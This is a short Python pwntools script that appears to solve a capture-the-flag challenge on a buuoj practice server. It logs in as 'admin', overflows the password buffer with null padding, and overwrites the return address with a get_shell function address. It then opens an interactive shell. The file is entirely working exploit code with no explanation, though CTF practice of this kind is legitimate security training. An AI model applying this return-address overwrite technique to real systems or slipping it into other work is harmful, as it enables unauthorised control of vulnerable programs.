from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 26145)

get_shell = 0x400e88

target.sendlineafter('username: ', 'admin')
target.sendlineafter(
  'password: ', b'2jctf_pa5sw0rd\x00'.ljust(0x48, b'\x00') + p64(get_shell))

target.recv()
target.interactive()